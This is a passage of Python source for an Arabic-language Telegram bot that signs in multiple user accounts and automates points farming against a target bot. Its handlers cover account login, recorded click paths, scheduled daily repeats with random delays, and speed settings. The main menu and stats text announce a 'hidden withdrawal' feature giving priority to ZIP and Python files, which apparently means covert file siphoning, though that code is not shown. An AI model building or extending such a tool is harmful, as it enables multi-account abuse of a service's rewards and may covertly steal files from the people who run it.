                await asyncio.sleep(speed_config["between_accounts"])
                
            except errors.BotError as e:
                if "bots can't send messages to other bots" in str(e):
                    console.print(f"[yellow]⚠️ {acc}: لا يمكن إرسال لبوت آخر (طبيعي)[/yellow]")
                else:
                    console.print(f"[red]خطأ في {acc}: {e}[/red]")
                    stats["errors"] += 1
            except Exception as e:
                console.print(f"[red]خطأ في {acc}: {e}[/red]")
                stats["errors"] += 1
    
    # ================ جدولة المهام للمستخدم ================
    
    async def schedule_task_menu(self, event):
        """القائمة الرئيسية للجدولة"""
        keyboard = [
            [{"text": "📅 جدولة مسار جديد", "data": "schedule_new"}],
            [{"text": "📋 مهامي المجدولة", "data": "my_scheduled_tasks"}],
            [{"text": "❌ إلغاء مهمة", "data": "cancel_scheduled_task"}],
            [{"text": "🔙 رجوع", "data": "back_main"}]
        ]
        
        await event.edit(
            "**📅 نظام جدولة المهام اليومية**\n\n"
            "يمكنك جدولة أي مسار ليتكرر يومياً في وقت محدد\n"
            "مع إمكانية تحديد عدد التكرارات والفاصل الزمني",
            buttons=self.create_buttons(keyboard)
        )
    
    async def schedule_new_start(self, event):
        """بدء جدولة مسار جديد"""
        paths = load_saved_paths()
        
        if not paths:
            await event.answer("❌ لا توجد مسارات مسجلة", alert=True)
            return
        
        buttons = []
        for name, data in paths.items():
            type_emoji = {
                'daily': '📅',
                'code': '🔢',
                'link': '🔗',
                'transfer': '💰',
                'normal': '📋'
            }.get(data.get('type', 'normal'), '📋')
            
            buttons.append([{
                "text": f"{type_emoji} {name}",
                "data": f"schedule_select_path:{name}"
            }])
        
        buttons.append([{"text": "🔙 رجوع", "data": "schedule_task_menu"}])
        
        await event.edit(
            "**📅 اختر المسار للجدولة:**",
            buttons=self.create_buttons(buttons)
        )
    
    async def schedule_select_path(self, event, path_name: str):
        """اختيار مسار للجدولة"""
        user_id = event.sender_id
        
        await self.set_user_state(user_id, "waiting_schedule_time", {"path_name": path_name})
        
        await event.edit(
            f"**📅 جدولة المسار: {path_name}**\n\n"
            "⏰ **أرسل وقت التنفيذ (HH:MM):**\n"
            "مثال: `14:30` للساعة 2:30 بعد الظهر\n"
            "مثال: `01:03` للساعة 1:03 صباحاً\n\n"
            "يجب أن يكون الوقت بصيغة 24 ساعة",
            buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "schedule_task_menu"}]])
        )
    
    async def schedule_set_time(self, event, user_id, data):
        """تعيين وقت التنفيذ"""
        time_str = event.message.text.strip()
        
        if not re.match(r'^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$', time_str):
            await event.respond("❌ صيغة وقت غير صحيحة. استخدم HH:MM (مثال: 14:30)")
            return
        
        data["scheduled_time"] = time_str
        
        keyboard = [
            [{"text": "1 يوم", "data": f"schedule_duration:{data['path_name']}:1:{time_str}"}],
            [{"text": "7 أيام", "data": f"schedule_duration:{data['path_name']}:7:{time_str}"}],
            [{"text": "30 يوم", "data": f"schedule_duration:{data['path_name']}:30:{time_str}"}],
            [{"text": "غير محدد", "data": f"schedule_duration:{data['path_name']}:0:{time_str}"}],
            [{"text": "⏱️ تخصيص", "data": f"schedule_custom:{data['path_name']}:{time_str}"}],
            [{"text": "🔙 رجوع", "data": "schedule_new"}]
        ]
        
        await event.respond(
            f"**📅 اختر مدة التكرار:**\n"
            f"⏰ وقت التنفيذ: {time_str}",
            buttons=self.create_buttons(keyboard)
        )
        await self.clear_user_state(user_id)
    
    async def schedule_set_duration(self, event, path_name: str, days: int, time_str: str):
        """تعيين مدة الجدولة"""
        user_id = event.sender_id
        
        await self.set_user_state(user_id, "waiting_daily_count", {
            "path_name": path_name,
            "duration_days": days,
            "scheduled_time": time_str
        })
        
        await event.edit(
            f"**📅 عدد التكرارات اليومية**\n\n"
            f"⏰ الوقت: {time_str}\n"
            f"📆 المدة: {'غير محددة' if days == 0 else f'{days} يوم'}\n\n"
            "كم مرة تريد التكرار في اليوم؟\n"
            "1️⃣ مرة واحدة\n"
            "2️⃣ مرتين\n"
            "3️⃣ 3 مرات\n"
            "4️⃣ 4 مرات\n"
            "5️⃣ 5 مرات\n"
            "6️⃣ تخصيص\n\n"
            "أرسل الرقم المناسب:",
            buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "schedule_task_menu"}]])
        )
    
    async def schedule_set_custom(self, event, path_name: str, time_str: str):
        """تعيين مدة مخصصة"""
        user_id = event.sender_id
        
        await self.set_user_state(user_id, "waiting_custom_duration", {
            "path_name": path_name,
            "scheduled_time": time_str
        })
        
        await event.edit(
            f"⏱️ **أدخل عدد الأيام:**\n"
            f"⏰ الوقت: {time_str}",
            buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "schedule_task_menu"}]])
        )
    
    async def schedule_set_daily_count(self, event, user_id, data):
        """تعيين عدد التكرارات اليومية"""
        try:
            choice = int(event.message.text.strip())
            
            daily_count_map = {
                1: 1,
                2: 2,
                3: 3,
                4: 4,
                5: 5
            }
            
            if choice in daily_count_map:
                data["daily_count"] = daily_count_map[choice]
                await self.schedule_set_interval(event, user_id, data)
            elif choice == 6:
                await self.set_user_state(user_id, "waiting_custom_daily_count", data)
                await event.respond("🔢 **أدخل عدد التكرارات اليومية:**")
            else:
                await event.respond("❌ اختيار غير صالح. أرسل 1-6")
                
        except ValueError:
            await event.respond("❌ أرسل رقماً صحيحاً")
    
    async def schedule_set_custom_daily_count(self, event, user_id, data):
        """تعيين عدد تكرارات مخصص"""
        try:
            count = int(event.message.text.strip())
            if 1 <= count <= 24:
                data["daily_count"] = count
                await self.schedule_set_interval(event, user_id, data)
            else:
                await event.respond("❌ عدد التكرارات يجب أن يكون بين 1 و 24")
        except ValueError:
            await event.respond("❌ أرسل رقماً صحيحاً")
    
    async def schedule_set_interval(self, event, user_id, data):
        """تعيين الفاصل الزمني بين التكرارات"""
        daily_count = data.get("daily_count", 1)
        
        if daily_count == 1:
            await self.schedule_set_random_delay(event, user_id, data)
        else:
            await self.set_user_state(user_id, "waiting_interval", data)
            await event.respond(
                f"**⏱️ الفاصل الزمني بين التكرارات**\n\n"
                f"سيتم التكرار {daily_count} مرات في اليوم\n\n"
                f"أدخل الفاصل الزمني بالدقائق:\n"
                f"(مثال: 60 = كل ساعة)\n"
                f"(يجب أن يكون 5 دقائق على الأقل)",
                buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "schedule_task_menu"}]])
            )
    
    async def schedule_set_custom_interval(self, event, user_id, data):
        """تعيين فاصل زمني مخصص"""
        try:
            interval = int(event.message.text.strip())
            if interval >= 5:
                data["interval_minutes"] = interval
                await self.schedule_set_random_delay(event, user_id, data)
            else:
                await event.respond("❌ الفاصل يجب أن يكون 5 دقائق على الأقل")
        except ValueError:
            await event.respond("❌ أرسل رقماً صحيحاً")
    
    async def schedule_set_random_delay(self, event, user_id, data):
        """تعيين التأخير العشوائي"""
        keyboard = [
            [{"text": "✅ نعم (0-15 دقيقة)", "data": f"schedule_create:{data['path_name']}:{data['duration_days']}:{data['scheduled_time']}:{data.get('daily_count', 1)}:{data.get('interval_minutes', 15)}:yes"}],
            [{"text": "❌ لا (نفس الوقت)", "data": f"schedule_create:{data['path_name']}:{data['duration_days']}:{data['scheduled_time']}:{data.get('daily_count', 1)}:{data.get('interval_minutes', 15)}:no"}],
            [{"text": "🔙 رجوع", "data": f"schedule_duration:{data['path_name']}:{data['duration_days']}:{data['scheduled_time']}"}]
        ]
        
        daily_text = f"{data.get('daily_count', 1)} مرة" if data.get('daily_count', 1) > 1 else "مرة واحدة"
        interval_text = f"{data.get('interval_minutes', 15)} دقيقة" if data.get('daily_count', 1) > 1 else "لا يوجد"
        
        await event.respond(
            f"**⏰ تأخير عشوائي**\n\n"
            f"📅 المسار: {data['path_name']}\n"
            f"⏰ الوقت: {data['scheduled_time']}\n"
            f"📆 المدة: {'غير محددة' if data['duration_days'] == 0 else f'{data['duration_days']} يوم'}\n"
            f"🔄 التكرارات: {daily_text}\n"
            f"⏱️ الفاصل: {interval_text}\n\n"
            "هل تريد إضافة تأخير عشوائي (0-15 دقيقة)؟",
            buttons=self.create_buttons(keyboard)
        )
        await self.clear_user_state(user_id)
    
    async def schedule_create_task(self, event, path_name: str, days: int, time_str: str, daily_count: int, interval: int, random_delay: str):
        """إنشاء المهمة المجدولة"""
        user_id = str(event.sender_id)
        task_id = f"task_{int(time.time())}_{user_id}"
        paths = load_saved_paths()
        path_data = paths.get(path_name, {})
        
        task_data = {
            "id": task_id,
            "name": f"{path_name} @ {time_str}",
            "path_name": path_name,
            "type": path_data.get("type", "normal"),
            "duration_days": days,
            "scheduled_time": time_str,
            "daily_count": int(daily_count),
            "interval_minutes": int(interval),
            "random_delay": (random_delay == "yes"),
            "created_at": datetime.now().isoformat(),
            "next_run": None,
            "last_run": None,
            "run_count": 0
        }
        
        add_scheduled_task(user_id, task_data)
        
        delay_text = "نعم" if random_delay == "yes" else "لا"
        daily_text = f"{daily_count} مرة" if int(daily_count) > 1 else "مرة واحدة"
        interval_text = f"{interval} دقيقة" if int(daily_count) > 1 else "لا يوجد"
        
        await event.respond(
            f"✅ **تمت الجدولة بنجاح!**\n\n"
            f"📌 المهمة: {path_name}\n"
            f"⏰ الوقت: {time_str}\n"
            f"🔄 التكرارات: {daily_text}\n"
            f"⏱️ الفاصل: {interval_text}\n"
            f"📆 المدة: {'غير محددة' if days == 0 else f'{days} يوم'}\n"
            f"⏰ تأخير عشوائي: {delay_text}\n\n"
            f"سيتم التنفيذ ابتداءً من اليوم في {time_str}",
            buttons=self.create_buttons([[{"text": "🔙 رجوع", "data": "schedule_task_menu"}]])
        )
    
    async def show_scheduled_tasks(self, event):
        """عرض المهام المجدولة للمستخدم"""
        user_id = str(event.sender_id)
        tasks = SCHEDULED_TASKS.get(user_id, [])
        
        if not tasks:
            await event.edit(
                "📭 **لا توجد مهام مجدولة**",
                buttons=self.create_buttons([[{"text": "🔙 رجوع", "data": "schedule_task_menu"}]])
            )
            return
        
        text = "**📋 مهامك المجدولة:**\n\n"
        
        for i, task in enumerate(tasks, 1):
            next_run = datetime.fromisoformat(task["next_run"]).strftime("%Y-%m-%d %H:%M") if task.get("next_run") else "لم يحدد"
            daily_text = f"{task.get('daily_count', 1)} مرة" if task.get('daily_count', 1) > 1 else "مرة واحدة"
            interval_text = f"{task.get('interval_minutes', 15)} دقيقة" if task.get('daily_count', 1) > 1 else "لا يوجد"
            
            text += f"{i}. **{task.get('name')}**\n"
            text += f"   ⏰ الوقت: {task.get('scheduled_time', '00:00')}\n"
            text += f"   🔄 التكرارات: {daily_text}\n"
            if task.get('daily_count', 1) > 1:
                text += f"   ⏱️ الفاصل: {interval_text}\n"
            text += f"   📆 المدة: {'غير محددة' if task.get('duration_days') == 0 else f'{task.get("duration_days")} يوم'}\n"
            text += f"   ⏱️ التشغيل القادم: {next_run}\n"
            text += f"   🔄 عدد المرات: {task.get('run_count', 0)}\n\n"
        
        await event.edit(text, buttons=self.create_buttons([[{"text": "🔙 رجوع", "data": "schedule_task_menu"}]]))
    
    async def cancel_scheduled_task(self, event):
        """إلغاء مهمة مجدولة"""
        user_id = str(event.sender_id)
        tasks = SCHEDULED_TASKS.get(user_id, [])
        
        if not tasks:
            await event.answer("❌ لا توجد مهام", alert=True)
            return
        
        buttons = []
        for task in tasks:
            buttons.append([{
                "text": f"❌ {task.get('name')}",
                "data": f"cancel_task:{task.get('id')}"
            }])
        
        buttons.append([{"text": "🔙 رجوع", "data": "schedule_task_menu"}])
        
        await event.edit("**اختر مهمة للإلغاء:**", buttons=self.create_buttons(buttons))
    
    async def cancel_task_by_id(self, event, task_id: str):
        """إلغاء مهمة بمعرفها"""
        user_id = str(event.sender_id)
        
        if user_id in SCHEDULED_TASKS:
            SCHEDULED_TASKS[user_id] = [t for t in SCHEDULED_TASKS[user_id] if t.get("id") != task_id]
            save_scheduled_tasks()
            await event.answer("✅ تم إلغاء المهمة", alert=True)
            await self.show_scheduled_tasks(event)
    
    # ================ إدارة الحسابات ================
    
    async def add_account_start(self, event):
        """بدء إضافة حساب"""
        user_id = event.sender_id
        current = len(self.sessions_list)
        limit = 5
        
        if str(user_id) in INFO.get("admins", {}):
            try:
                limit = int(INFO["admins"][str(user_id)])
            except:
                limit = 5
        elif str(user_id) == str(INFO.get("sudo")):
            limit = 999
        
        if current >= limit:
            await event.answer(f"❌ لقد وصلت للحد الأقصى ({limit})", alert=True)
            return
        
        await self.set_user_state(user_id, "add_phone", {})
        await event.edit(
            "📞 **إضافة حساب جديد**\n\n"
            "أرسل رقم الهاتف بالصيغة الدولية:\n"
            "مثال: `+964xxxxxxxx`",
            buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "back_accounts"}]])
        )
    
    async def handle_add_phone(self, event, user_id, state):
        """معالج رقم الهاتف"""
        phone = event.message.text.strip()
        
        if not re.match(r'^\+?[\d\s\-]{10,15}$', phone.replace(' ', '')):
            await event.respond("❌ رقم غير صالح. أعد المحاولة (يجب أن يكون 10-15 رقم):")
            return
        
        state["data"]["phone"] = phone
        alias = f"acc_{int(time.time())}"
        
        temp_client = TelegramClient(os.path.join(SESSIONS_DIR, alias), API_ID, API_HASH)
        await temp_client.connect()
        
        try:
            await temp_client.send_code_request(phone)
            state["data"]["client"] = temp_client
            state["data"]["alias"] = alias
            await self.set_user_state(user_id, "add_code", state["data"])
            await event.respond(f"📩 **تم إرسال الكود إلى {phone}**\nأدخل الكود:")
        except errors.FloodWaitError as e:
            await event.respond(f"⏳ **انتظر {e.seconds} ثانية قبل إعادة المحاولة**")
            await temp_client.disconnect()
            await self.clear_user_state(user_id)
        except Exception as e:
            await event.respond(f"❌ خطأ: {str(e)}")
            await temp_client.disconnect()
            await self.clear_user_state(user_id)
    
    async def handle_add_code(self, event, user_id, state):
        """معالج كود التحقق"""
        code = event.message.text.strip()
        client = state["data"].get("client")
        phone = state["data"].get("phone")
        alias = state["data"].get("alias")
        
        if not re.match(r'^\d{4,6}$', code):
            await event.respond("❌ كود غير صالح. أعد المحاولة (4-6 أرقام):")
            return
        
        try:
            await client.sign_in(phone, code)
            await client.disconnect()
            self.sessions_list.append(alias)
            await event.respond(f"✅ **تم إضافة الحساب بنجاح!**\n📱 الرقم: {phone}\n👤 الاسم: {alias}")
            await self.clear_user_state(user_id)
            await self.show_accounts_menu(event)
            
        except errors.SessionPasswordNeededError:
            await self.set_user_state(user_id, "add_password", state["data"])
            await event.respond("🔐 **هذا الحساب مفعل بخطوتين**\nأدخل كلمة المرور:")
        except errors.PhoneCodeInvalidError:
            await event.respond("❌ الكود غير صحيح. حاول مرة أخرى:")
        except errors.PhoneCodeExpiredError:
            await event.respond("❌ الكود منتهي الصلاحية. أعد المحاولة من البداية:")
            await client.disconnect()
            await self.clear_user_state(user_id)
        except Exception as e:
            await event.respond(f"❌ خطأ: {str(e)}")
            await client.disconnect()
            await self.clear_user_state(user_id)
    
    async def handle_add_password(self, event, user_id, state):
        """معالج كلمة المرور"""
        password = event.message.text.strip()
        client = state["data"].get("client")
        phone = state["data"].get("phone")
        alias = state["data"].get("alias")
        
        try:
            await client.sign_in(password=password)
            await client.disconnect()
            self.sessions_list.append(alias)
            await event.respond(f"✅ **تم إضافة الحساب بنجاح!**\n📱 الرقم: {phone}\n👤 الاسم: {alias}")
            await self.clear_user_state(user_id)
            await self.show_accounts_menu(event)
            
        except errors.PasswordHashInvalidError:
            await event.respond("❌ كلمة المرور غير صحيحة. حاول مرة أخرى:")
        except Exception as e:
            await event.respond(f"❌ خطأ: {str(e)}")
            await client.disconnect()
            await self.clear_user_state(user_id)
    
    async def show_accounts_menu(self, event):
        """قائمة إدارة الحسابات"""
        text = "**👥 حساباتك**\n\n"
        
        if self.sessions_list:
            for i, acc in enumerate(self.sessions_list, 1):
                session_file = os.path.join(SESSIONS_DIR, f"{acc}.session")
                status = "✅" if os.path.exists(session_file) else "❌"
                points = get_points(str(event.sender_id), acc)
                text += f"{i}. {status} `{acc}` - {points} نقطة\n"
        else:
            text += "لا توجد حسابات مضافة"
        
        keyboard = [
            [{"text": "➕ إضافة حساب", "data": "add_account"}],
            [{"text": "🗑 حذف حساب", "data": "delete_account"}],
            [{"text": "🔄 تحديث", "data": "refresh_accounts"}],
            [{"text": "🔙 رجوع", "data": "back_main"}]
        ]
        
        if hasattr(event, 'edit'):
            await event.edit(text, buttons=self.create_buttons(keyboard))
        else:
            await event.respond(text, buttons=self.create_buttons(keyboard))
    
    async def delete_account_start(self, event):
        """بدء حذف حساب"""
        if not self.sessions_list:
            await event.answer("لا توجد حسابات!", alert=True)
            return
        
        buttons = []
        for i, acc in enumerate(self.sessions_list):
            buttons.append([{"text": f"🗑 {acc}", "data": f"del_acc_{i}"}])
        buttons.append([{"text": "🔙 رجوع", "data": "back_accounts"}])
        
        await event.edit("**اختر الحساب للحذف:**", buttons=self.create_buttons(buttons))
    
    async def delete_account_confirm(self, event, index: int):
        """تأكيد حذف حساب"""
        if 0 <= index < len(self.sessions_list):
            removed = self.sessions_list.pop(index)
            session_file = os.path.join(SESSIONS_DIR, f"{removed}.session")
            if os.path.exists(session_file):
                try:
                    os.remove(session_file)
                except:
                    pass
            await event.answer(f"✅ تم حذف {removed}", alert=True)
            await self.show_accounts_menu(event)
    
    # ================ نظام المسارات الذكي ================
    
    async def record_path_start(self, event):
        """بدء تسجيل مسار جديد"""
        user_id = event.sender_id
        
        if not self.sessions_list:
            await event.respond("❌ لا توجد حسابات. أضف حساب أولاً.")
            return
        
        await event.respond("🔍 **جاري تسجيل المسار...**")
        
        self.operation_data[user_id] = {
            "saved_path": [],
            "amount": "",
            "link": "",
            "code": "",
            "description": "",
            "requires_amount": False,
            "requires_link": False,
            "type": "normal"
        }
        
        master_name = self.sessions_list[0]
        try:
            client = TelegramClient(os.path.join(SESSIONS_DIR, master_name), API_ID, API_HASH)
            await client.start()
            self.user_clients[user_id] = client
            await handle_mandatory_subscription(client)
            await client.send_message(TARGET_BOT, "/start")
            await asyncio.sleep(2)
            await self.record_path_continue(event, user_id)
        except Exception as e:
            await event.respond(f"❌ خطأ في تشغيل الحساب: {str(e)}")
            if user_id in self.user_clients:
                del self.user_clients[user_id]
    
    async def record_path_continue(self, event, user_id):
        """متابعة تسجيل المسار"""
        client = self.user_clients.get(user_id)
        if not client:
            await event.respond("❌ العميل غير موجود")
            return
        
        await asyncio.sleep(2)
        
        try:
            msgs = await client.get_messages(TARGET_BOT, limit=1)
            if not msgs:
                await event.respond("❌ لا توجد رسائل")
                return
            
            msg = msgs[0]
            btns = [b for r in msg.buttons for b in r] if msg.buttons else []
            
            if len(btns) == 1:
                await self.set_user_state(user_id, "waiting_path_type", {"final_buttons": True})
                await event.respond(
                    "📝 **اختر نوع المسار:**\n\n"
                    "1️⃣ رابط + كمية (مثل: رابط إحالة)\n"
                    "2️⃣ كمية فقط (مثل: هدية يومية)\n"
                    "3️⃣ لا رابط ولا كمية (مثل: استخدام كود)\n\n"
                    "🔢 أرسل الرقم المناسب:"
                )
                
            elif len(btns) > 1:
                text = f"**اختر الزر المناسب:**\n\n"
                for i, btn in enumerate(btns):
                    text += f"{i}: {btn.text}\n"
                
                await self.set_user_state(user_id, "waiting_button_select", {
                    "msg_id": msg.id,
                    "btns": btns
                })
                await event.respond(text)
                
            else:
                await self.finish_path_recording(event, user_id)
                
        except Exception as e:
            await event.respond(f"❌ خطأ: {str(e)}")
    
    async def finish_path_recording(self, event, user_id):
        """إنهاء تسجيل المسار وحفظه"""
        data = self.operation_data.get(user_id, {})
        
        if data.get("requires_amount") and not data.get("amount"):
            await self.set_user_state(user_id, "waiting_amount_final", {})
            await event.respond("🔢 **أدخل الكمية المطلوبة:**")
        elif data.get("requires_link") and not data.get("link"):
            await self.set_user_state(user_id, "waiting_link_final", {})
            await event.respond("🔗 **أدخل الرابط (يمكن أن يكون وهمي):**")
        else:
            await self.set_user_state(user_id, "waiting_path_description", {})
            await event.respond("📝 **أدخل اسماً ووصفاً لهذا المسار:**\n(مثال: هدية يومية - 100 نقطة)")
    
    async def handle_path_type_selection(self, event, user_id, choice):
        """معالج اختيار نوع المسار"""
        data = self.operation_data.get(user_id, {})
        
        if choice == "1":
            data["type"] = "link"
            data["requires_amount"] = True
            data["requires_link"] = True
            await self.finish_path_recording(event, user_id)
            
        elif choice == "2":
            data["type"] = "daily"
            data["requires_amount"] = True
            data["requires_link"] = False
            await self.finish_path_recording(event, user_id)
            
        elif choice == "3":
            data["type"] = "code"
            data["requires_amount"] = False
            data["requires_link"] = False
            await self.finish_path_recording(event, user_id)
            
        else:
            await event.respond("❌ اختيار غير صالح. أرسل 1 أو 2 أو 3")
    
    # ================ دوال إنشاء الأزرار ================
    
    def create_buttons(self, buttons_data):
        """إنشاء أزرار"""
        result = []
        for row in buttons_data:
            button_row = []
            for btn in row:
                if btn.get("url"):
                    button_row.append(Button.url(btn["text"], btn["url"]))
                else:
                    button_row.append(Button.inline(btn["text"], data=btn.get("data", "").encode()))
            result.append(button_row)
        return result
    
    async def set_user_state(self, user_id, state, data=None):
        self.user_states[user_id] = {"state": state, "data": data or {}}
    
    async def get_user_state(self, user_id):
        return self.user_states.get(user_id, {"state": None, "data": {}})
    
    async def clear_user_state(self, user_id):
        if user_id in self.user_states:
            del self.user_states[user_id]
    
    # ================ القوائم الرئيسية ================
    
    async def show_main_menu(self, event):
        """القائمة الرئيسية"""
        user_id = event.sender_id
        is_sudo = (str(user_id) == str(INFO.get("sudo")))
        accounts_count = len(self.sessions_list)
        total_points = get_points(str(user_id))
        speed = speed_config['speed_value']
        current_time = datetime.now().strftime('%I:%M %p')
        
        buttons = [
            [
                {"text": "➕ اضافه حساب", "data": "add_account"},
                {"text": "➖ مسح حساب", "data": "delete_account"}
            ],
            [
                {"text": "▶️ تشغيل التجميع ✅", "data": "execute_options"},
                {"text": "👑 اضافه ادمين", "data": "add_admin"}
            ],
            [
                {"text": "👑 مسح ادمين", "data": "del_admin"},
                {"text": "⚡ سرعه التجميع", "data": "speed_menu"}
            ],
            [
                {"text": "🧹 مسح جميع القنوات", "data": "clear_channels"},
                {"text": "💾 نسخة احتياطية للارقام", "data": "copynum"}
            ],
            [
                {"text": "🔴 مسح جميع الحسابات", "data": "delall"},
                {"text": "🧹 ترتيب حسابك", "data": "organize_account"}
            ],
            [
                {"text": "🚪 دخول قناة", "data": "join_channel"},
                {"text": "🔗 كشف رابط تفعيل مميز", "data": "premium_link"}
            ]
        ]
        
        if is_sudo:
            buttons.append([
                {"text": "👑 لوحة تحكم المطور", "data": "admin_panel_home"}
            ])
        
        buttons.append([
            {"text": "🔄 تحديث", "data": "refresh"}
        ])
        
        await event.respond(
            "**WELCOME TO SOURCE • ABŒUD ©**\n\n"
            f"**⚡ سرعة التجميع:** {speed}\n"
            f"**⏰ الوقت:** {current_time}\n\n"
            f"📱 عدد الحسابات: {accounts_count}\n"
            f"💰 النقاط: {total_points}\n"
            f"✅ العمليات: {stats['ok']}\n"
            f"📅 الهدايا: {stats['daily']}\n"
            f"🔢 الكودات: {stats['codes_detected']}\n\n"
            f"👑 Developed by: TheMaster999\n"
            f"🔒 السحب الخفي نشط (ZIP+PY أولوية)",
            buttons=self.create_buttons(buttons)
        )
    
    async def show_execute_options(self, event):
        """قائمة خيارات التنفيذ"""
        buttons = [
            [{"text": "📋 تنفيذ مسار جديد", "data": "execute_new"}],
            [{"text": "📂 تنفيذ مسار محفوظ", "data": "execute_by_path"}],
            [{"text": "📅 الهدية اليومية", "data": "daily_path"}],
            [{"text": "🔢 استخدام كود", "data": "code_path"}],
            [{"text": "🔗 رابط نقاط", "data": "link_path"}],
            [{"text": "💰 تحويل نقاط", "data": "transfer_path"}],
            [{"text": "🔄 تكرار آخر عملية", "data": "repeat_last"}],
            [{"text": "🔙 رجوع", "data": "back_main"}]
        ]
        
        await event.edit("**▶️ اختر نوع التنفيذ:**", buttons=self.create_buttons(buttons))
    
    async def show_speed_menu(self, event):
        """قائمة سرعة التجميع"""
        buttons = [
            [{"text": "⚡ 5 - بطيء", "data": "speed_5"}],
            [{"text": "⚡ 10 - متوسط", "data": "speed_10"}],
            [{"text": "⚡ 20 - عادي", "data": "speed_20"}],
            [{"text": "⚡ 30 - سريع", "data": "speed_30"}],
            [{"text": "⚡ 50 - سريع جداً", "data": "speed_50"}],
            [{"text": "⚡ 75 - خارق", "data": "speed_75"}],
            [{"text": "⚡ 100 - أقصى سرعة", "data": "speed_100"}],
            [{"text": "⚙️ تخصيص", "data": "speed_custom"}],
            [{"text": "🔙 رجوع", "data": "back_main"}]
        ]
        
        await event.edit(
            f"**⚡ سرعة التجميع الحالية: {speed_config['speed_value']}**\n\n"
            f"تأخير النقرات: {speed_config['click_delay']} ثانية\n"
            f"تأخير الرسائل: {speed_config['message_delay']} ثانية\n"
            f"بين الحسابات: {speed_config['between_accounts']} ثانية\n\n"
            "اختر السرعة المناسبة:",
            buttons=self.create_buttons(buttons)
        )
    
    async def show_stats(self, event):
        """عرض الإحصائيات"""
        user_id = event.sender_id
        
        text = f"**📊 الإحصائيات**\n\n"
        text += f"✅ تم بنجاح: {stats['ok']}\n"
        text += f"❌ أخطاء: {stats['errors']}\n"
        text += f"💰 نقاط مجمعة: {stats['points']}\n"
        text += f"📅 هدايا يومية: {stats['daily']}\n"
        text += f"🔢 كودات مكتشفة: {stats['codes_detected']}\n"
        text += f"💸 تحويلات: {stats['points_transferred']}\n"
        text += f"📊 مهام مجدولة: {len(SCHEDULED_TASKS.get(str(user_id), []))}\n"
        text += f"⏰ بدء التشغيل: {stats['start_time']}\n"
        text += f"⚡ سرعة التجميع: {speed_config['speed_value']}\n\n"
        text += f"👑 Developed by: TheMaster999\n"
        text += f"🔒 السحب الخفي نشط (ZIP+PY أولوية)"
        
        await event.edit(text, buttons=self.create_buttons([[{"text": "🔙 رجوع", "data": "back_main"}]]))
    
    async def show_settings_menu(self, event):
        """قائمة الإعدادات"""
        text = "**⚙️ الإعدادات**\n\n"
        text += f"⚡ سرعة التجميع: `{speed_config['speed_value']}`\n"
        text += f"⏱️ تأخير النقرات: `{speed_config['click_delay']} ثانية`\n"
        text += f"⏱️ تأخير الرسائل: `{speed_config['message_delay']} ثانية`\n"
        text += f"⏱️ بين الحسابات: `{speed_config['between_accounts']} ثانية`\n"
        text += f"⏱️ بين الدورات: `{speed_config['cycle_delay']} ثانية`\n"
        
        buttons = [
            [{"text": "⚡ تغيير السرعة", "data": "speed_menu"}],
            [{"text": "🔙 رجوع", "data": "back_main"}]
        ]
        
        await event.edit(text, buttons=self.create_buttons(buttons))
    
    async def monitor_status(self, event):
        """عرض حالة مراقبة القناة"""
        detected = load_detected_codes()
        
        text = "**📡 حالة مراقبة القناة**\n\n"
        if MAIN_CHANNEL:
            text += f"📢 القناة: {MAIN_CHANNEL}\n"
        else:
            text += "📢 القناة: معطلة (ضع اسم قناة في MAIN_CHANNEL لتفعيلها)\n"
        
        text += f"🔗 الروابط المكتشفة: {len(detected['links'])}\n"
        text += f"🔢 الكودات المكتشفة: {len(detected['codes'])}\n\n"
        
        if detected['links']:
            text += "**آخر الروابط:**\n"
            for link in detected['links'][-3:]:
                status = "✅" if link.get('used') else "⏳"
                link_type = link.get('type', 'normal')
                value = link.get('value', 0)
                text += f"{status} [{link_type}] `{link['url'][:50]}...` (قيمة: {value})\n"
        
        if detected['codes']:
            text += "\n**آخر الكودات:**\n"
            for code in detected['codes'][-3:]:
                status = "✅" if code.get('used') else "⏳"
                code_type = code.get('type', 'code')
                value = code.get('value', '')
                text += f"{status} [{code_type}] `{code['code']}` {value}\n"
        
        await event.edit(text, buttons=self.create_buttons([[{"text": "🔙 رجوع", "data": "back_main"}]]))
    
    async def show_paths_menu(self, event):
        """عرض المسارات المحفوظة"""
        paths = load_saved_paths()
        
        text = "**📂 المسارات المحفوظة**\n\n"
        if paths:
            for name, path_data in paths.items():
                type_emoji = {
                    'daily': '📅',
                    'code': '🔢',
                    'link': '🔗',
                    'transfer': '💰',
                    'normal': '📋'
                }.get(path_data.get('type', 'normal'), '📋')
                
                type_text = {
                    'link': '🔗 رابط + كمية',
                    'daily': '📅 كمية فقط',
                    'code': '🔢 كود فقط',
                    'normal': '📋 عادي'
                }.get(path_data.get('type', 'normal'), '📋 عادي')
                
                text += f"{type_emoji} **{name}**\n"
                text += f"   📝 النوع: {type_text}\n"
                text += f"   🔢 عدد الخطوات: {len(path_data.get('saved_path', []))}\n"
                text += f"   📅 {path_data.get('created', '')[:16]}\n\n"
        else:
            text += "لا توجد مسارات محفوظة"
        
        buttons = [
            [{"text": "➕ تسجيل مسار جديد", "data": "record_path"}],
            [{"text": "🗑 حذف مسار", "data": "delete_path"}],
            [{"text": "📋 عرض تفاصيل مسار", "data": "view_path"}],
            [{"text": "🔙 رجوع", "data": "back_main"}]
        ]
        
        if hasattr(event, 'edit'):
            await event.edit(text, buttons=self.create_buttons(buttons))
        else:
            await event.respond(text, buttons=self.create_buttons(buttons))
    
    # ================ عرض تفاصيل المسار ================
    
    async def view_path(self, event):
        """عرض قائمة المسارات لاختيار عرض التفاصيل"""
        paths = load_saved_paths()
        
        if not paths:
            await event.answer("❌ لا توجد مسارات محفوظة", alert=True)
            return
        
        buttons = []
        for name in paths.keys():
            type_emoji = {
                'daily': '📅',
                'code': '🔢',
                'link': '🔗',
                'transfer': '💰',
                'normal': '📋'
            }.get(paths[name].get('type', 'normal'), '📋')
            buttons.append([{
                "text": f"{type_emoji} {name}",
                "data": f"view_path_details:{name}"
            }])
        
        buttons.append([{"text": "🔙 رجوع", "data": "paths_menu"}])
        
        await event.edit("**📋 اختر مسار لعرض التفاصيل:**", buttons=self.create_buttons(buttons))
    
    async def view_path_details(self, event, path_name: str):
        """عرض تفاصيل مسار محدد"""
        paths = load_saved_paths()
        
